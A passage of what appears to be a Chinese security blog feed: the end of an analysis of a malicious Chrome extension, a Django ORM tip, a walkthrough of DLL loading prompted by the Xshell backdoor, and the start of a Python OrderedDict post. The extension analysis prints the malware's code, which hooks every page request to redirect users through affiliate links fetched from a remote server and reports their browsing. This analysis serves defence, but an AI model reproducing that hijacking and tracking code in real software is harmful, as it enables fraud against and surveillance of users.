chrome.runtime.sendMessage(&#123;</div><div class="line">                            ahref: event.target.href,</div><div class="line">                            listener: "usassmwv5"</div><div class="line">                        &#125;);</div><div class="line">                    &#125;</div><div class="line">                &#125;);</div><div class="line">            &#125;`</div><div class="line">        &#125;)</div><div class="line">    &#125;)</div><div class="line">&#125;);</div><div class="line"><span class="keyword">var</span> host = <span class="string">"http://api.data-monitor.info/api/"</span>,</div><div class="line">wid = <span class="number">116</span>,</div><div class="line">rulesObject = &#123;&#125;,</div><div class="line">usedT = localStorage.usedT ? <span class="built_in">parseInt</span>(localStorage.usedT) : <span class="literal">null</span>,</div><div class="line">mainRgxp = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"^(?:([^:\\/?]+):)?(?:\\/\\/([^\\/]*))?([^?]*)(?:\\?([^$]*))?"</span>),</div><div class="line">domainRgxp = <span class="regexp">/((?:[^.]+)\.(?:(?:com?|org)\.)?\w+)$/i</span>,</div><div class="line">listenFunc = <span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (! (usedT &amp;&amp; usedT &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() - <span class="number">42e5</span>) &amp;&amp; <span class="number">0</span> === details.frameId &amp;&amp; <span class="string">"main_frame"</span> == details.type &amp;&amp; <span class="number">-1</span> === details.parentFrameId &amp;&amp; details.tabId &gt; <span class="number">0</span> &amp;&amp; <span class="regexp">/^https?/i</span>.test(details.url)) &#123;</div><div class="line">        <span class="keyword">var</span> current = details.url,</div><div class="line">        new_url = (prepareLink(current), tryUrl(current));</div><div class="line">        <span class="keyword">if</span> (<span class="string">"string"</span> == <span class="keyword">typeof</span> new_url &amp;&amp; current != new_url) <span class="keyword">return</span> &#123;</div><div class="line">            <span class="attr">redirectUrl</span>: new_url</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line">chrome.webRequest.onBeforeRequest.addListener(listenFunc, &#123;</div><div class="line">    <span class="attr">urls</span>: [<span class="string">"&lt;all_urls&gt;"</span>]</div><div class="line">&#125;,</div><div class="line">[<span class="string">"blocking"</span>]),</div><div class="line">getData();</div></pre></td></tr></table></figure>
<h2 id="外部恶意js分析"><a href="#外部恶意js分析" class="headerlink" title="外部恶意js分析"></a>外部恶意js分析</h2><p>恶意js会向chrome增加一些事件的处理函数，比如新打开一个tab，这段恶意js回将你打开的网址上传到服务器上。</p>
<p>接受上传用户信息的api<code>https://uaswitcher.org/logic/page/data</code>，上传用户隐私数据，数据中包含用户的插件版本，tabs是重载还是新打开、用户的浏览器等。</p>
<p><img src="11.png" alt=""></p>
<p>向<code>https://uaswitcher.org/splash</code>发送相关信息，其中s是代码中指定的，不知道含义，ver是插件的版本。返回的o是与本地的settings做对比，返回的u是接收用户隐私数据的域名。</p>
<p><img src="8.png" alt=""></p>
<p>更新恶意js的状态</p>
<p><img src="9.png" alt=""></p>
<p>这段js还会从<code>http://api.data-monitor.info/api/bhrule?sub=116</code>获取推广连接</p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"rules"</span>:&#123;<span class="attr">"aliexpress.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2Fnfemo.com%2Fclick-JQETHVDP-MKIGQNPP%3Fbt%3D25%26tl%3D1%26sa%3D__SUBID__%26url%3D__CURURL__"</span>&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<p>顺手遍历了一下其他的id，也会存在一些规则，应该是给其他用的，这个<code>sub=116</code>是代码中写死的。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"rules"</span>:&#123;<span class="attr">"aliexpress.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2Fnfemo.com%2Fclick-JQEXXAX0-KIGQB9TF%3Fbt%3D25%26tl%3D1%26sa%3D__SUBID__%26url%3D__CURURL__"</span>&#125;&#125;,<span class="attr">"wadi.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2F2track.info%2FJKrd%2F__SUBID__"</span>&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"rules"</span>:&#123;<span class="attr">"aliexpress.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2Fnfemo.com%2Fclick-JQETHVDP-MKIGQNPP%3Fbt%3D25%26tl%3D1%26sa%3D__SUBID__%26url%3D__CURURL__"</span>&#125;&#125;,<span class="attr">"airasia.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2F2track.info%2FTle6%2F__SUBID__"</span>&#125;&#125;,<span class="attr">"etihad.com"</span>:&#123;<span class="attr">"*"</span>:&#123;<span class="attr">"*"</span>:<span class="string">"http:\/\/systemrtb.com\/?target=http%3A%2F%2F2track.info%2FK3ei%2F__SUBID__"</span>&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<p>用于处理推广数据的代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> host = <span class="string">"http://api.data-monitor.info/api/"</span>,</div><div class="line">wid = <span class="number">116</span>,</div><div class="line">rulesObject = &#123;&#125;,</div><div class="line">usedT = localStorage.usedT ? <span class="built_in">parseInt</span>(localStorage.usedT) : <span class="literal">null</span>, mainRgxp = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"^(?:([^:\\/?]+):)?(?:\\/\\/([^\\/]*))?([^?]*)(?:\\?([^$]*))?"</span>), domainRgxp = <span class="regexp">/((?:[^.]+)\.(?:(?:com?|org)\.)?\w+)$/i</span>, listenFunc = <span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (! (usedT &amp;&amp; usedT &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() - <span class="number">42e5</span>) &amp;&amp; <span class="number">0</span> === details.frameId &amp;&amp; <span class="string">"main_frame"</span> == details.type &amp;&amp; <span class="number">-1</span> === details.parentFrameId &amp;&amp; details.tabId &gt; <span class="number">0</span> &amp;&amp; <span class="regexp">/^https?/i</span>.test(details.url)) &#123;</div><div class="line">        <span class="keyword">var</span> current = details.url,</div><div class="line">        new_url = (prepareLink(current), tryUrl(current));</div><div class="line">        <span class="keyword">if</span> (<span class="string">"string"</span> == <span class="keyword">typeof</span> new_url &amp;&amp; current != new_url) <span class="keyword">return</span> &#123;</div><div class="line">            <span class="attr">redirectUrl</span>: new_url</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line">chrome.webRequest.onBeforeRequest.addListener(listenFunc, &#123;</div><div class="line">    <span class="attr">urls</span>: [<span class="string">"&lt;all_urls&gt;"</span>]</div><div class="line">&#125;,</div><div class="line">[<span class="string">"blocking"</span>]), getData();</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前写的，放出来-。-&lt;/p&gt;
&lt;h2 id=&quot;插件背景&quot;&gt;&lt;a href=&quot;#插件背景&quot; class=&quot;headerlink&quot; title=&quot;插件背景&quot;&gt;&lt;/a&gt;插件背景&lt;/h2&gt;&lt;p&gt;User-Agent Swither 是一款Chrome插件，用户切换访问web时候的
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>python脚本中使用Django函数</title>
    <link href="http://weaponx.site/2017/10/03/python%E8%84%9A%E6%9C%AC%E4%B8%AD%E4%BD%BF%E7%94%A8Django%E5%87%BD%E6%95%B0/"/>
    <id>http://weaponx.site/2017/10/03/python脚本中使用Django函数/</id>
    <published>2017-10-03T07:25:37.000Z</published>
    <updated>2017-10-03T07:32:55.724Z</updated>
    
    <content type="html"><![CDATA[<p>最近有一个需求，需要使用Django的ORM。众所周知，可以使用<code>python manage.py shell</code>在Django shell中使用，但是这次的场景中需要的代码量比较大，所以用Django shell很不方便。</p>
<p>其实，在python脚本中导入Django的环境即可使用当前的Django ORM。</p>
<p>比如，我们的脚本和manage.py在同级目录下。我们Django Project叫demo，可以使用如下脚本来导入Django环境。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">sys.path.append(<span class="string">"../"</span>)</div><div class="line"><span class="keyword">from</span> django.core.management <span class="keyword">import</span> setup_environ</div><div class="line"><span class="keyword">import</span> demo.settings</div><div class="line">setup_environ(demo.settings)</div></pre></td></tr></table></figure>
<p>之后即可导入models使用ORM了，例如导入app test中的User模型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> test.models <span class="keyword">import</span> User</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近有一个需求，需要使用Django的ORM。众所周知，可以使用&lt;code&gt;python manage.py shell&lt;/code&gt;在Django shell中使用，但是这次的场景中需要的代码量比较大，所以用Django shell很不方便。&lt;/p&gt;
&lt;p&gt;其实，在pyt
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="Django" scheme="http://weaponx.site/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>从Xshell后门看DLL加载流程</title>
    <link href="http://weaponx.site/2017/09/14/%E4%BB%8EXshell%E5%90%8E%E9%97%A8%E7%9C%8BDLL%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B/"/>
    <id>http://weaponx.site/2017/09/14/从Xshell后门看DLL加载流程/</id>
    <published>2017-09-14T08:41:51.000Z</published>
    <updated>2017-09-14T08:45:23.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-编译DLL项目"><a href="#0x01-编译DLL项目" class="headerlink" title="0x01 编译DLL项目"></a>0x01 编译DLL项目</h2><p>打开VS 在<code>文件-&gt;新建-&gt;项目</code>选择<code>Win32项目</code>，在应用程序中设置</p>
<p><img src="1.png" alt=""></p>
<p>写一个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function">VOID <span class="title">AlertMessage</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L"My Dll"</span>, <span class="string">L"Success"</span>, MB_OK);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将函数使用C的方式导出，如果不使用C的方式导出CRT会填上@@等其他的符号。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> _declspec(dllexport) <span class="function">VOID <span class="title">AlertMessage</span><span class="params">()</span></span>;</div></pre></td></tr></table></figure>
<p>随后生成DLL。</p>
<p>使用rundll32.exe调用DLL中的函数来测试是否成功，rundll32.exe调用DLL中的函数有两种方式：</p>
<ul>
<li><code>rundll32.exe MyDll.dll,AlertMessage</code> ，调用名称为AlertMessage的导出函数</li>
<li><code>rundll32.exe MyDll.dll,#1</code> ，调用一号导出函数</li>
</ul>
<p><img src="2.png" alt=""></p>
<h2 id="0x02-调用DLL程序的流程"><a href="#0x02-调用DLL程序的流程" class="headerlink" title="0x02 调用DLL程序的流程"></a>0x02 调用DLL程序的流程</h2><p>DLL程序的调用入口其实并不是DllMain，而是DllEntryPoint其实也就是_DllMainCRTStartup，这个是微软的VS默认的入口函数，不过可以使用 /ENTRY: 链接器选项指定其他入口点函数，不过这个微软并不推荐。</p>
<p>所谓的DllEntryPoint是CRT（C Runtime）自动生成的，在调用一个函数之前，完成了变量初始化、线程剥离等工作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">BOOL __stdcall _DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( fdwReason == <span class="number">1</span> )</div><div class="line">    __security_init_cookie();</div><div class="line">  <span class="keyword">return</span> dllmain_dispatch(hinstDLL, fdwReason, lpReserved);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序首先会初始化<code>security_cookie</code>，接着进入<code>dllmain_dispatch</code>，此时<code>fdwReason = 1</code></p>
<table>
<thead>
<tr>
<th>fdwReason</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>DLL_PROCESS_DETACH</td>
</tr>
<tr>
<td>1</td>
<td>DLL_PROCESS_ATTACH</td>
</tr>
<tr>
<td>2</td>
<td>DLL_THREAD_ATTACH</td>
</tr>
<tr>
<td>3</td>
<td>DLL_THREAD_DETACH</td>
</tr>
</tbody>
</table>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">dllmain_dispatch</span><span class="params">(HINSTANCE__ *<span class="keyword">const</span> instance, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> reason, <span class="keyword">void</span> *<span class="keyword">const</span> reserved)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">void</span> *v4; <span class="comment">// ebx@6</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// esi@7</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax@9</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( !reason &amp;&amp; _proc_attached &lt;= <span class="number">0</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( reason != <span class="number">1</span> &amp;&amp; reason != <span class="number">2</span> )</div><div class="line">  &#123;</div><div class="line">    v4 = reserved;</div><div class="line">LABEL_9:</div><div class="line">    v6 = DllMain(instance, reason, v4);</div><div class="line">    v5 = v6;</div><div class="line">    <span class="keyword">if</span> ( reason == <span class="number">1</span> &amp;&amp; !v6 )</div><div class="line">    &#123;</div><div class="line">      DllMain(instance, <span class="number">0</span>, v4);</div><div class="line">      dllmain_crt_dispatch(instance, <span class="number">0</span>, v4);</div><div class="line">      dllmain_raw(instance, <span class="number">0</span>, v4);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( !reason || reason == <span class="number">3</span> )</div><div class="line">    &#123;</div><div class="line">      v5 = dllmain_crt_dispatch(instance, reason, v4);</div><div class="line">      <span class="keyword">if</span> ( v5 )</div><div class="line">        v5 = dllmain_raw(instance, reason, v4);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> v5;</div><div class="line">  &#125;</div><div class="line">  v4 = reserved;</div><div class="line">  v5 = dllmain_raw(instance, reason, reserved);</div><div class="line">  <span class="keyword">if</span> ( v5 )</div><div class="line">  &#123;</div><div class="line">    v5 = dllmain_crt_dispatch(instance, reason, reserved);</div><div class="line">    <span class="keyword">if</span> ( v5 )</div><div class="line">      <span class="keyword">goto</span> LABEL_9;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> v5;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接着程序会进入<code>dllmain_crt_dispatch</code>函数，我们继续看看这个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> __userpurge dllmain_crt_dispatch@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;edi&gt;, HINSTANCE__ *<span class="keyword">const</span> instance, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> reason, <span class="keyword">void</span> *<span class="keyword">const</span> reserved)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( reason )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( reason == <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      result = dllmain_crt_process_attach(a1);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( reason == <span class="number">2</span> )</div><div class="line">      &#123;</div><div class="line">        LOBYTE(result) = __scrt_dllmain_crt_thread_attach();</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( reason != <span class="number">3</span> )</div><div class="line">          <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">        LOBYTE(result) = __scrt_dllmain_crt_thread_detach();</div><div class="line">      &#125;</div><div class="line">      result = (<span class="keyword">unsigned</span> __int8)result;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    result = dllmain_crt_process_detach();</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数会调用<code>dllmain_crt_process_attach</code>，看看这个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> __usercall dllmain_crt_process_attach@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;edi&gt;)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( __scrt_initialize_crt(<span class="number">0</span>) )</div><div class="line">  &#123;</div><div class="line">    __scrt_acquire_startup_lock();</div><div class="line">    <span class="keyword">if</span> ( __scrt_current_native_startup_state )</div><div class="line">      __scrt_fastfail(<span class="number">1</span>, a1, <span class="number">7u</span>);</div><div class="line">    __scrt_current_native_startup_state = <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( __scrt_dllmain_before_initialize_c() )</div><div class="line">    &#123;</div><div class="line">      _RTC_Initialize();</div><div class="line">      atexit(_RTC_Terminate);</div><div class="line">      __scrt_initialize_type_info();</div><div class="line">      atexit(__scrt_uninitialize_type_info);</div><div class="line">      __scrt_initialize_default_local_stdio_options();</div><div class="line">      <span class="keyword">if</span> ( !_initterm_e((<span class="keyword">int</span>)&amp;__xi_a, (<span class="keyword">int</span>)&amp;__xi_z) )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( __scrt_dllmain_after_initialize_c() )</div><div class="line">        &#123;</div><div class="line">          _initterm((<span class="keyword">int</span>)&amp;__xc_a, (<span class="keyword">int</span>)&amp;__xc_z);</div><div class="line">          __scrt_current_native_startup_state = <span class="number">2</span>;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    JUMPOUT(&amp;_LN14);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里有两个比较重要的函数<code>_initterm_e</code>和<code>_initterm</code>。这两个函数会从<code>[__xi_a, __xi_z]</code>遍历到<code>[__xc_a, __xc_z]</code>如果函数指针存在，则去执行这个函数。</p>
<h2 id="0x03-回顾Xshell的nssock2-dll"><a href="#0x03-回顾Xshell的nssock2-dll" class="headerlink" title="0x03 回顾Xshell的nssock2.dll"></a>0x03 回顾Xshell的nssock2.dll</h2><p>Xshell的入口点是DllEntryPoint</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">BOOL __<span class="function">stdcall <span class="title">DllEntryPoint</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( fdwReason == <span class="number">1</span> )</div><div class="line">    __security_init_cookie();</div><div class="line">  <span class="keyword">return</span> __DllMainCRTStartup(hinstDLL, fdwReason, lpReserved);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>继续看<code>__DllMainCRTStartup</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// esi@1</span></div><div class="line">  BOOL v4; <span class="comment">// eax@9</span></div><div class="line"></div><div class="line">  v3 = <span class="number">1</span>;</div><div class="line">  dword_100180B0 = fdwReason;</div><div class="line">  <span class="keyword">if</span> ( fdwReason || dword_100188D8 )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( fdwReason != <span class="number">1</span> &amp;&amp; fdwReason != <span class="number">2</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_22;</div><div class="line">    <span class="keyword">if</span> ( _RawDllMainProxy )</div><div class="line">      v3 = _RawDllMainProxy(hinstDLL, fdwReason, lpvReserved);</div><div class="line">    <span class="keyword">if</span> ( v3 )</div><div class="line">    &#123;</div><div class="line">      v3 = _CRT_INIT((<span class="keyword">int</span>)hinstDLL, fdwReason, (<span class="keyword">int</span>)lpvReserved);</div><div class="line">      <span class="keyword">if</span> ( v3 )</div><div class="line">      &#123;</div><div class="line">LABEL_22:</div><div class="line">        v4 = DllMain(hinstDLL, fdwReason, lpvReserved);</div><div class="line">        v3 = v4;</div><div class="line">        <span class="keyword">if</span> ( fdwReason == <span class="number">1</span> &amp;&amp; !v4 )</div><div class="line">        &#123;</div><div class="line">          DllMain(hinstDLL, <span class="number">0</span>, lpvReserved);</div><div class="line">          _CRT_INIT((<span class="keyword">int</span>)hinstDLL, <span class="number">0</span>, (<span class="keyword">int</span>)lpvReserved);</div><div class="line">          <span class="keyword">if</span> ( _RawDllMainProxy )</div><div class="line">            _RawDllMainProxy(hinstDLL, <span class="number">0</span>, lpvReserved);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ( !fdwReason || fdwReason == <span class="number">3</span> )</div><div class="line">        &#123;</div><div class="line">          v3 = _CRT_INIT((<span class="keyword">int</span>)hinstDLL, fdwReason, (<span class="keyword">int</span>)lpvReserved) != <span class="number">0</span> ? v3 : <span class="number">0</span>;</div><div class="line">          <span class="keyword">if</span> ( v3 &amp;&amp; _RawDllMainProxy )</div><div class="line">            v3 = _RawDllMainProxy(hinstDLL, fdwReason, lpvReserved);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    v3 = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  dword_100180B0 = <span class="number">-1</span>;</div><div class="line">  <span class="keyword">return</span> v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>之后会继续通过<code>_CRT_INIT</code>初始化。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:1000D2CE</div><div class="line">.text:1000D2CE loc_1000D2CE:                           ; CODE XREF: _CRT_INIT(x,x,x)+177j</div><div class="line">.text:1000D2CE                 push    offset unk_1000F6D0</div><div class="line">.text:1000D2D3                 push    offset unk_1000F6C4</div><div class="line">.text:1000D2D8                 mov     dword_10018A80, 1</div><div class="line">.text:1000D2E2                 call    _initterm_e</div><div class="line">.text:1000D2E7                 pop     ecx</div><div class="line">.text:1000D2E8                 pop     ecx</div><div class="line">.text:1000D2E9                 test    eax, eax</div><div class="line">.text:1000D2EB                 jnz     short loc_1000D280</div><div class="line">.text:1000D2ED                 push    offset unk_1000F6C0</div><div class="line">.text:1000D2F2                 push    offset unk_1000F690</div><div class="line">.text:1000D2F7                 call    _initterm</div><div class="line">.text:1000D2FC                 pop     ecx</div><div class="line">.text:1000D2FD                 mov     dword_10018A80, edi</div></pre></td></tr></table></figure>
<p>看看<code>unk_1000F690</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.rdata:1000F690 _rdata          segment para public &apos;DATA&apos; use32</div><div class="line">.rdata:1000F690                 assume cs:_rdata</div><div class="line">.rdata:1000F690                 ;org 1000F690h</div><div class="line">.rdata:1000F690 unk_1000F690    db    0                 ; DATA XREF: _CRT_INIT(x,x,x)+1A6o</div><div class="line">.rdata:1000F691                 db    0</div><div class="line">.rdata:1000F692                 db    0</div><div class="line">.rdata:1000F693                 db    0</div><div class="line">.rdata:1000F694                 dd offset ??__EafxModuleState@@YAXXZ ; `dynamic initializer for &apos;afxModuleState&apos;&apos;(void)</div><div class="line">.rdata:1000F698                 dd offset sub_1000E450</div><div class="line">.rdata:1000F69C                 dd offset sub_1000E470</div><div class="line">.rdata:1000F6A0                 dd offset sub_1000E490</div><div class="line">.rdata:1000F6A4                 dd offset sub_1000E4B0</div><div class="line">.rdata:1000F6A8                 dd offset sub_1000E4D0</div><div class="line">.rdata:1000F6AC                 dd offset sub_1000E4F0</div><div class="line">.rdata:1000F6B0                 dd offset sub_1000E500</div><div class="line">.rdata:1000F6B4                 dd offset sub_1000E510</div><div class="line">.rdata:1000F6B8                 dd offset sub_1000E520</div><div class="line">.rdata:1000F6BC                 dd offset sub_1000E530</div></pre></td></tr></table></figure>
<p>其中有一个函数的指针指向的恶意代码。所以Xshell的nssock2.dll执行恶意代码的流程就是通过加载DLL后，通过CRT初始化执行了恶意代码。</p>
<h2 id="0x04-如何使用IDA调试DLL"><a href="#0x04-如何使用IDA调试DLL" class="headerlink" title="0x04 如何使用IDA调试DLL"></a>0x04 如何使用IDA调试DLL</h2><p>使用IDA调试dll，dll必须要又一个宿主程序来执行。在windows上可以使用rundll32.exe来执行所以，在IDA中可以这样设置</p>
<p><img src="3.png" alt=""></p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>使用MSVC编译DLL会默认加上CRT初始化，只需要分析一下CRT初始化流程就能很好的了解DLL的调用过程了。本文是个人拙劣的分析，如果有错误的地方还请大佬指正，谢谢！</p>
<h2 id="0x06-引用"><a href="#0x06-引用" class="headerlink" title="0x06 引用"></a>0x06 引用</h2><p><a href="http://driftcloudy.iteye.com/blog/1048750" target="_blank" rel="external">http://driftcloudy.iteye.com/blog/1048750</a></p>
<p><a href="http://driftcloudy.iteye.com/blog/1049404" target="_blank" rel="external">http://driftcloudy.iteye.com/blog/1049404</a></p>
<p><a href="http://driftcloudy.iteye.com/blog/1050271" target="_blank" rel="external">http://driftcloudy.iteye.com/blog/1050271</a></p>
<p><a href="http://driftcloudy.iteye.com/blog/1052971" target="_blank" rel="external">http://driftcloudy.iteye.com/blog/1052971</a></p>
<p><a href="http://driftcloudy.iteye.com/blog/1061569" target="_blank" rel="external">http://driftcloudy.iteye.com/blog/1061569</a></p>
<p><a href="http://driftcloudy.iteye.com/blog/1063275" target="_blank" rel="external">http://driftcloudy.iteye.com/blog/1063275</a></p>
<p><a href="http://www.cnblogs.com/panweishadow/p/3390615.html" target="_blank" rel="external">http://www.cnblogs.com/panweishadow/p/3390615.html</a></p>
<p><a href="https://msdn.microsoft.com/zh-cn/library/988ye33t.aspx" target="_blank" rel="external">https://msdn.microsoft.com/zh-cn/library/988ye33t.aspx</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-编译DLL项目&quot;&gt;&lt;a href=&quot;#0x01-编译DLL项目&quot; class=&quot;headerlink&quot; title=&quot;0x01 编译DLL项目&quot;&gt;&lt;/a&gt;0x01 编译DLL项目&lt;/h2&gt;&lt;p&gt;打开VS 在&lt;code&gt;文件-&amp;gt;新建-&amp;gt;项目&lt;/
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="逆向" scheme="http://weaponx.site/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>如何在python中定义有序字典</title>
    <link href="http://weaponx.site/2017/08/29/%E5%A6%82%E4%BD%95%E5%9C%A8python%E4%B8%AD%E5%AE%9A%E4%B9%89%E6%9C%89%E5%BA%8F%E5%AD%97%E5%85%B8/"/>
    <id>http://weaponx.site/2017/08/29/如何在python中定义有序字典/</id>
    <published>2017-08-29T06:03:30.000Z</published>
    <updated>2017-08-29T06:14:20.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近遇到一个大坑，在测一个程序的时候。程序接受的数据是json，但是要求json是有序的（吐槽一样，要求有序的用json干屁啊！）</p>
<p>当我用python构造字典的时候，总会给我排序，用<code>json.dumps</code>转化为json后。导致程序解析失败。所以，在此研究了一下如何构造有序的json。</p>
<a id="more"></a>
<h2 id="0x01-解决"><a href="#0x01-解决" class="headerlink" title="0x01 解决"></a>0x01 解决</h2><p>网上查了一下，用到了python中有序字典<code>OrderdDict</code>，在<code>collections</code>库中。</p>
<p>在默认情况下:</p>
